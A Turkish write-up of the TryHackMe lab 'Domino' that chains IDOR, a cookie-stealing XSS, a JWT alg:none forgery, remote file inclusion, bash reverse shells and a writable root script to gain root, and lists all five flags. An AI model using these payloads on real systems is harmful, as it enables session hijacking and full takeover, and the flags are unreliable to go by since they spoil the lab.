# DOMINO — TryHackMe WriteUp

## Nmap ile Başlayalım

İlk olarak makinede hangi portların açık olduğunu görmek için klasik Nmap taramamı attım.

```bash
nmap -sS -A -p- 10.114.161.206
```
<img width="828" height="588" alt="nmap" src="https://github.com/user-attachments/assets/aaa5d7fa-9676-40d2-8312-4404ac5d4a70" />

SSH'ın açık olması ileride işimize yarayabilir ama şu an elimizde bir kullanıcı adı ve parola olmadığı için ilk olarak web uygulamasına bakmak daha mantıklı.

---

## Web Sitesine Bakalım

Siteyi açtığımda bir login ekranı karşıma çıktı.

Burada kullanıcı adı ve parola gerekiyor. Direkt brute force'a başlamadan önce uygulamada login olmadan erişebileceğimiz başka endpointler var mı diye kontrol etmek istedim.

Bunun için ffuf kullandım:

```bash
ffuf -u http://10.114.161.206/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
<img width="1045" height="566" alt="FFUF" src="https://github.com/user-attachments/assets/d1910819-07cf-4137-8845-e44102a4e67b" />

Özellikle `backup`, `api` ve `static` dizinlerine bakmaya başladım.

---

## Backup Dizininden Gelen İlk İpucu

<img width="909" height="448" alt="backupdizin" src="https://github.com/user-attachments/assets/718ded98-b454-492f-83f5-e62dfe0caa09" />

`/backup/` dizinine girdiğimde bir `readme` dosyası karşıma çıktı.

<img width="748" height="225" alt="readme" src="https://github.com/user-attachments/assets/ab37408d-7528-4337-99d0-760904a2d797" />

Dosyada `config.enc` isimli şifrelenmiş bir config dosyasından bahsediliyordu. Ayrıca dosyanın çözülmesi için kullanılacak key'in `static/app.js` içerisinde olduğunu belirten bir bilgi vardı.

`static/app.js` dosyasını açtığımda şu bilgileri gördüm:

<img width="1175" height="745" alt="staticappjs" src="https://github.com/user-attachments/assets/1e4d12a8-9f01-484b-ae53-c81860b1e7d8" />

```javascript
apiBase: '/api'
_backupKey: 'N3xusK3y2024!!'
AES-ECB-128
```

Burada artık elimizde hem encryption algoritması hem de key vardı.

`N3xusK3y2024!!` değerini hex formatına çevirip OpenSSL ile dosyayı çözmeyi denedim:

```bash
openssl enc -d -aes-128-ecb -in config.enc -out config.dec -K 4e337875734b33793230323421210000
```

Daha sonra dosyanın gerçekten düzgün şekilde oluşup oluşmadığını kontrol ettim:

```bash
file config.dec
cat config.dec
```

Karşıma şu config çıktı:

<img width="925" height="298" alt="configdec" src="https://github.com/user-attachments/assets/57c958f7-cf33-4f3c-add5-506022efaafe" />

Burada özellikle `devops` kullanıcı adına dikkat ettim. Şimdilik bir kenara not aldım.

---

## Kullanıcı İsimlerini Toplamak

Web sitesinde `Our Team` bölümünü fark ettim.

Burada çalışanların isimleri ve kullanıcı bilgileri listeleniyordu. Buradaki kullanıcı adlarını not alıp `users.txt` dosyasına koydum.

<img width="756" height="331" alt="userstxt" src="https://github.com/user-attachments/assets/c4d066ba-cc78-49fd-a926-fa4861f5cd35" />

Elimizde artık login endpointi ve olası kullanıcı isimleri vardı. Bu yüzden parola denemesi yapmayı denedim.

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.114.161.206 http-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid"
```
Hydra sonucunda bazı geçerli kullanıcı bilgileri elde ettim.

Bunlardan biriyle web uygulamasına giriş yaptım.

<img width="1296" height="333" alt="hydra" src="https://github.com/user-attachments/assets/5fa3964e-6ccd-4d70-b48a-6059d5030586" />

---

## Profile API'yi Kurcalayalım

<img width="1919" height="462" alt="firstloginsarah" src="https://github.com/user-attachments/assets/1f740dbc-4168-4e56-a0ff-fffa67329f4c" />

Login olduktan sonra dashboard üzerinde `My Profile API` şeklinde bir bölüm gördüm.

Tıkladığımda şu URL açıldı:

```text
/profile.php?id=3
```

Burada `id` parametresi olduğu için aklıma direkt başka kullanıcıların ID'lerini deneyip deneyemeyeceğim geldi.

Örneğin:

```text
/profile.php?id=1
```
şeklinde değiştirmeye başladım.

Başka kullanıcıların profillerini görüntüleyebildiğimi fark ettim. Bir noktada admin kullanıcısının profilini de okuyabildim.

Admin kullanıcısının profil notlarında ilk flag vardı:

<img width="1375" height="272" alt="firstflag" src="https://github.com/user-attachments/assets/d83826e0-3267-46ef-823e-36b2255dc7f1" />

### Flag 1

`THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`

---

## Ticket Sistemine Bakalım

<img width="1919" height="679" alt="openticket" src="https://github.com/user-attachments/assets/ae8d4816-2c9e-47f7-b815-e7e754c0d0f2" />

Daha sonra dashboard'a geri dönüp `Open Ticket` bölümüne baktım.

Buradan yeni ticket oluşturabiliyordum. Bir ticket oluşturduğumda durumunun `Pending` olduğunu gördüm.

Bu noktada ticket'ın başka bir kullanıcı veya admin tarafından inceleniyor olabileceğini düşündüm.

Cookie'leri kontrol ettiğimde session cookie'sinde `HttpOnly` flag'inin aktif olmadığını fark ettim.

Bu önemliydi çünkü eğer ticket içeriği başka bir kullanıcı tarafından açılıyorsa JavaScript çalıştırmayı deneyebilirdim.

Basit bir XSS payload'ı hazırladım:

<img width="1716" height="484" alt="xsspayload" src="https://github.com/user-attachments/assets/a122590e-2a6d-41dc-9f61-3c6254540424" />

```html
<script>fetch("http://192.168.154.242:82/test.php?data="+btoa(document.cookie));</script>
```

Kendi makinemde gelen isteği dinlemek için listener açtım:

```bash
nc -nvlp 82
```

Ticket oluşturduktan sonra beklediğim istek geldi.

Gelen cookie içerisinde admin session'ına ait bilgi bulunuyordu:

```text
nexus_session=eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
```
<img width="1426" height="199" alt="tokenaldık" src="https://github.com/user-attachments/assets/2dbfaff7-44ed-4dcb-ad5a-a815eaa3d8b4" />

Bu cookie'yi kendi session'ımda kullanıp sayfayı yenilediğimde artık admin olarak giriş yapmış olduğumu gördüm.

Admin panelinde ikinci flag karşıma çıktı.

### Flag 2

`THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}`

<img width="1919" height="591" alt="flag2" src="https://github.com/user-attachments/assets/cd15a73f-d62d-49ee-a5c4-b0c042b9231b" />

---

## API Tarafına Geçelim

Admin erişimini aldıktan sonra `/api/auth/token.php` endpointini incelemeye başladım.

Burada token ile ilgili önemli bir not vardı:

<img width="1919" height="368" alt="adminauthapi" src="https://github.com/user-attachments/assets/ef2e9c13-c10d-4749-9d17-218a52dd98cb" />

Yani burada kullanılan token'ı cookie olarak değil, `Authorization` header'ı içerisinde göndermemiz gerekiyor.

İlk olarak elimdeki token ile API'ye istek attım:

```bash
curl -i -H "Authorization: Bearer <TOKEN>" http://10.114.161.206/api/files.php
```
<img width="1467" height="215" alt="hata" src="https://github.com/user-attachments/assets/ba5321ef-cf45-4a2f-ba2c-ddcb02f15525" />

Fakat beklediğim sonucu alamadım.

Token'ın yapısını inceleyince JWT formatında olduğunu gördüm. Burada JWT'nin algoritma kontrolünün nasıl yapıldığını test etmek istedim.

`alg` değerini `none` yaparak yeni bir token oluşturdum.

Payload içerisinde de admin rolünü belirttim:

```json
{"sub":"laura.hayes","role":"admin"}
```

Ortaya çıkan token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiJ9.
```

Bu token ile tekrar API'ye istek attım:

```bash
curl -i -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiJ9." http://10.114.161.206/api/files.php
```

Bu sefer API isteği kabul etti.

Burada JWT doğrulamasında `alg:none` durumunun kabul edildiğini anladım.

---

## files.php'yi İnceleyelim

Artık `/api/files.php` endpointine erişebildiğimize göre parametreleri incelemeye başladım.

`name` parametresinin dosya adı/path aldığını gördüm.

Önce endpointin kendi kaynak kodunu okumayı denedim:

```bash
curl -s -H "Authorization: Bearer $TOKEN" "http://10.114.161.206/api/files.php?name=/var/www/html/api/files.php"
```

Burada önemli bir şey ortaya çıktı.

Endpoint, URL verilmesi durumunda uzak bir kaynaktan içerik çekiyor ve daha sonra bunu PHP olarak çalıştırıyordu.

Bu noktada bunun sadece dosya okuma olmadığını, uzak bir payload vererek komut çalıştırmaya kadar götürülebileceğini düşündüm.

<img width="1457" height="271" alt="filephpokuma" src="https://github.com/user-attachments/assets/c1e0733d-3a5f-4fe9-844d-cd6339be3ea3" />

---

## İlk Shell'i Almak

Önce kendi makinemde basit bir payload dosyası hazırladım.

`shell.txt`:

```php
system("bash -c 'bash -i >& /dev/tcp/192.168.154.242/4444 0>&1'");
```

Dosyayı hedef makinenin erişebileceği HTTP server üzerinden yayınladım:

```bash
python3 -m http.server 8000
```

Diğer terminalde shell için listener açtım:

```bash
nc -lvnp 4444
```

Daha sonra API üzerinden payload'ın URL'sini verdim:

```bash
curl -s -H "Authorization: Bearer $TOKEN" --get --data-urlencode "name=http://192.168.154.242:8000/payload.txt" http://10.114.161.206/api/files.php
```

<img width="769" height="134" alt="reverseshellalmak içinyok" src="https://github.com/user-attachments/assets/ced0a68a-acf9-4f68-8472-520e736b5233" />

Bir süre sonra listener'a bağlantı geldi.



İlk shell oldukça kısıtlıydı. Terminali biraz daha kullanılabilir hale getirmek için:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

ve:

```bash
export TERM=xterm-256color
```
komutlarını kullandım.

<img width="893" height="549" alt="reverseshellaldım" src="https://github.com/user-attachments/assets/0ad5ed2e-804d-4aef-86d8-bd2a40bd6871" />

---

## RCE Sonrası

Shell aldıktan sonra sistemde biraz enumeration yapmaya başladım.

Önce `/opt` dizinine baktım:

```bash
ls -la /opt
```

Burada `flag3.txt` dosyasını gördüm.

```bash
cat /opt/flag3.txt
```

### Flag 3

`THM{rf1_2_rc3_f00th0ld_fl4g3}`

<img width="655" height="142" alt="flag3" src="https://github.com/user-attachments/assets/2d94f022-47a7-4efd-ad95-b177d5de04d5" />

---

## DevOps Kullanıcısına Geçiş

RCE aldıktan sonra web uygulamasının PHP dosyalarını da incelemeye başladım.

`/var/www/html/` altında dikkatimi çeken bir PHP dosyası buldum.

Dosyada database bağlantısı için kullanılan bilgiler vardı:

<img width="1365" height="714" alt="catphp" src="https://github.com/user-attachments/assets/cbaa396b-2a55-434d-a471-06381178fa44" />

<img width="985" height="436" alt="configphp" src="https://github.com/user-attachments/assets/f13032ab-4723-48e2-8b31-8f1b2c812c0b" />


Buradaki parola oldukça dikkat çekiciydi.

Daha önce config dosyasında `devops` kullanıcısını görmüştüm. Sistemde gerçekten bu kullanıcı var mı diye baktım:

```bash
cat /etc/passwd
```
<img width="1118" height="683" alt="etcpasswd" src="https://github.com/user-attachments/assets/0a9a6281-3124-44c5-a343-f2ca3a212325" />

`devops` kullanıcısının mevcut olduğunu gördüm.

Parolayı `devops` hesabında denedim:

```bash
su devops
```

Parola olarak:

```text
D3v0ps!2024
```

kullandığımda kullanıcıya geçebildim.

Burada uygulamadaki credential'ın sistem kullanıcı hesabında da tekrar kullanıldığını görmüş olduk.

---

## DevOps Home Directory

DevOps kullanıcısına geçtikten sonra home dizinini kontrol ettim.

Burada dördüncü flag bulunuyordu:

### Flag 4

`THM{s5h_cr3d_r3u53_l4t3r4l_f14g4}`

<img width="629" height="229" alt="flag4" src="https://github.com/user-attachments/assets/7736d303-59e5-4ae0-9539-123b74f1e51a" />

---

## Monitoring Script'i

Daha önce `/opt` altında `monitoring` dizinini görmüştüm.

Bu sefer devops kullanıcısıyla:

```bash
ls -la /opt/monitoring
```

komutunu çalıştırdım.

Burada `health_report.sh` isimli bir script vardı.

Dosyanın izinlerine baktığımda önemli bir durum gördüm. Script root tarafından çalıştırılıyor ancak devops grubunun dosya üzerinde yazma yetkisi bulunuyordu.

Yani script'in içerisine eklediğimiz herhangi bir komut, script root tarafından çalıştırıldığında root yetkisiyle çalışabilecekti.

Bu nedenle script'e kendi shell payload'ımı ekledim:

```bash
echo 'bash -i >& /dev/tcp/192.168.154.242/9999 0>&1' >> health_report.sh
```

Sonra kendi makinemde listener açtım:

```bash
nc -nvlp 9999
```

Script'in root tarafından çalıştırılmasını bekledim.

Bir süre sonra bağlantı geldi ve root shell elde ettim.

<img width="767" height="146" alt="rootshell" src="https://github.com/user-attachments/assets/bd2bb634-d7f1-4d26-9db2-28ab9deca21c" />

---

## Son Flag

Artık root yetkimiz vardı.

Son olarak root flag'ini okuyarak makineyi tamamladım:

```bash
cat /root/root.txt
```

<img width="782" height="268" alt="flag5" src="https://github.com/user-attachments/assets/d2518070-de75-4692-9c86-b5ab633bba3b" />

Son flag:

`THM{pr1v3sc_cr0n_r00t_fl4g5}`

---

## Flagler

| # | Flag                                  |
| - | ------------------------------------- |
| 1 | `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`   |
| 2 | `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}` |
| 3 | `THM{rf1_2_rc3_f00th0ld_fl4g3}`       |
| 4 | `THM{s5h_cr3d_r3u53_l4t3r4l_f14g4}`   |
| 5 | `THM{pr1v3sc_cr0n_r00t_fl4g5}`        |
